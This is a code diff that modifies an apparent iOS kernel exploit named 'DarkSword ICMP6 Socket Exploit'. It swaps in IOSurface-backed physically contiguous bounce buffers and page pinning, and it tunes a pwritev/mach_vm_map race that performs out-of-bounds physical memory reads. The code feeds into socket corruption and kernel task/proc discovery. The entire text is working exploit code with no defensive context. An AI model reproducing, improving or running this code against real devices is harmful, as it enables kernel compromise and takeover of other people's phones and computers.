@@ -20,6 +20,8 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <stdarg.h>
+#import <IOSurface/IOSurfaceRef.h>
+void IOSurfacePrefetchPages(IOSurfaceRef surface);
 
 extern kern_return_t mach_vm_allocate(task_t, mach_vm_address_t *, mach_vm_size_t, int);
 extern kern_return_t mach_vm_deallocate(task_t, mach_vm_address_t, mach_vm_size_t);
@@ -35,6 +37,7 @@ extern kern_return_t mach_vm_map(task_t, mach_vm_address_t *, mach_vm_size_t,
 
 // ===== Global state =====
 static uint64_t randomMarker;
+static uint64_t wiredPageMarker;
 static mach_port_t pcObject = MACH_PORT_NULL;
 static mach_vm_address_t pcAddress = 0;
 static mach_vm_size_t pcSize;
@@ -51,9 +54,11 @@ static volatile mem_entry_name_port_t targetObject = 0;
 static volatile memory_object_offset_t targetObjectOffset = 0;
 static pthread_t freeThread;
 static int highestSuccessIdx = 0;
+static int successReadCount = 0;
 static struct iovec iov;
 static char executablePath[PATH_MAX];
 static const char *executableName;
+static NSMutableDictionary *gMlockDict;
 
 // Kernel state globals (used by all phases)
 uint64_t gOurProc, gKernelProc, gOurTask, gKernelTask, gIS_TABLE;
@@ -79,22 +84,92 @@ void memset64(void *ptr, uint64_t val, size_t sz) {
 
 // ===== DarkSword ICMP6 Socket Exploit =====
 
-static bool create_bounce_buffer(mach_port_t *port, mach_vm_address_t *addr, mach_vm_size_t size) {
-    kern_return_t kr = mach_vm_allocate(mach_task_self(), addr, size,
-        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
-    if (kr != KERN_SUCCESS) {
-        printf("[-] mach_vm_allocate(%llu): %s\n", size, mach_error_string(kr));
-        return false;
+IOSurfaceRef create_surface_with_address(uint64_t address, uint64_t size) {
+    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)@{
+        @"IOSurfaceAddress": @(address),
+        @"IOSurfaceAllocSize": @(size)
+    });
+    IOSurfacePrefetchPages(surface);
+    return surface;
+}
+
+void surface_mlock(uint64_t address, uint64_t size) {
+    gMlockDict[@(address)] = (__bridge id)create_surface_with_address(address, size);
+}
+
+void surface_munlock(uint64_t address, uint64_t size) {
+    IOSurfaceRef ref = (__bridge IOSurfaceRef)gMlockDict[@(address)];
+    if (ref) {
+        CFRelease(ref);
+        [gMlockDict removeObjectForKey:@(address)];
     }
-    memset64((void*)*addr, randomMarker, size);
-    kr = mach_make_memory_entry_64(mach_task_self(), &size, *addr,
-        VM_PROT_DEFAULT, port, 0);
+}
+
+static void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *address, mach_vm_size_t size) {
+    NSDictionary *params = @{
+        (__bridge id)kIOSurfaceAllocSize : @(size),
+        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
+    };
+
+    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
+
+    if (!surface) {
+        printf("[-] IOSurfaceCreate failed — falling back to pure Mach VM\n");
+        kern_return_t kr = mach_vm_allocate(mach_task_self(), address, size,
+            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
+        if (kr != KERN_SUCCESS) {
+            printf("[-] mach_vm_allocate: %s\n", mach_error_string(kr));
+            return;
+        }
+        memset64((void*)*address, randomMarker, size);
+        kr = mach_make_memory_entry_64(mach_task_self(), &size, *address,
+            VM_PROT_DEFAULT, port, 0);
+        if (kr != KERN_SUCCESS) {
+            printf("[-] mach_make_memory_entry_64: %s\n", mach_error_string(kr));
+            mach_vm_deallocate(mach_task_self(), *address, size);
+            return;
+        }
+        printf("[+] fallback bounce buffer: entry=%u va=0x%llx size=0x%llx\n", *port, *address, size);
+        return;
+    }
+
+    void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);
+    printf("[+] physicalMappingAddress: %p\n", physicalMappingAddress);
+
+    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &size,
+        (mach_vm_address_t)physicalMappingAddress, VM_PROT_DEFAULT, port, 0);
     if (kr != KERN_SUCCESS) {
         printf("[-] mach_make_memory_entry_64: %s\n", mach_error_string(kr));
-        mach_vm_deallocate(mach_task_self(), *addr, size);
+        CFRelease(surface);
+        return;
+    }
+
+    kr = mach_vm_map(mach_task_self(), address, size, 0,
+        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, *port, 0, 0,
+        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] mach_vm_map: %s\n", mach_error_string(kr));
+        mach_port_deallocate(mach_task_self(), *port);
+        CFRelease(surface);
+        return;
+    }
+
+    CFRelease(surface);
+    printf("[+] IOSurface bounce buffer: entry=%u va=0x%llx size=0x%llx\n", *port, *address, size);
+}
+
+static bool initialize_bounce_buffer(uint64_t size) {
+    pcSize = size;
+    create_physically_contiguous_mapping(&pcObject, &pcAddress, pcSize);
+    if (!pcObject || !pcAddress) {
+        printf("[-] create_physically_contiguous_mapping failed\n");
         return false;
     }
-    printf("[+] bounce buffer: entry=%u va=0x%llx size=0x%llx\n", *port, *addr, size);
+    memset64((void *)pcAddress, randomMarker, pcSize);
+    freeTarget = pcAddress;
+    freeTargetSize = pcSize;
+    freeThreadStart = 1;
+    goSync = 1;
     return true;
 }
 
@@ -175,24 +250,29 @@ kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
     iov.iov_len = off + size;
     *(uint64_t*)buf = randomMarker;
     *(uint64_t*)(pcAddress + 0x3f00 + off) = randomMarker;
+    bool readRaceSucceeded = false;
     for (int t = 0; t < highestSuccessIdx + 100; t++) {
         raceSync = 1;
-        pwritev(readFd, &iov, 1, 0x3f00);
+        int w = (int)pwritev(readFd, &iov, 1, 0x3f00);
         while (raceSync == 1) {}
-        mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
+        kern_return_t kr = mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
             VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
-        pread(readFd, buf, size, 0x3f00 + off);
-        if (*(uint64_t*)buf != randomMarker) {
-            if (t > highestSuccessIdx) highestSuccessIdx = t;
-            targetObject = 0;
-            return KERN_SUCCESS;
+        if (kr != KERN_SUCCESS) return 1;
+        if (w == -1) {
+            pread(readFd, buf, size, 0x3f00 + off);
+            if (*(uint64_t*)buf != randomMarker) {
+                readRaceSucceeded = true;
+                successReadCount++;
+                if (t > highestSuccessIdx) highestSuccessIdx = t;
+                break;
+            }
+            usleep(1);
         }
-        usleep(1);
         if (t == 500) break;
     }
     targetObject = 0;
-    return 1;
+    return readRaceSucceeded ? KERN_SUCCESS : 1;
 }
 
 kern_return_t phys_oob_read_retry(mach_port_t memObj, mach_vm_offset_t memOff,
@@ -354,7 +434,10 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
 }
 
 bool run_darksword(void) {
-    randomMarker = arc4random();
+    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
+    wiredPageMarker = (uint64_t)arc4random() << 32 | arc4random();
+    successReadCount = 0;
+    gMlockDict = [NSMutableDictionary new];
     printf("[+] randomMarker: 0x%016llx\n", randomMarker);
     init_target_file();
     uint32_t sz = PATH_MAX;
@@ -404,6 +487,7 @@ bool run_darksword(void) {
             mach_vm_size_t mos = searchSize;
             mach_make_memory_entry_64(mach_task_self(), &mos, sma,
                 VM_PROT_DEFAULT, &memObj, 0);
+            surface_mlock(sma, searchSize);
 
             for (mach_vm_offset_t so = 0; so < searchSize; so += PAGE_SIZE) {
                 if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
@@ -413,6 +497,7 @@ bool run_darksword(void) {
                     }
                 }
             }
+            surface_munlock(sma, searchSize);
             mach_port_deallocate(mach_task_self(), memObj);
             if (ok) break;
         }
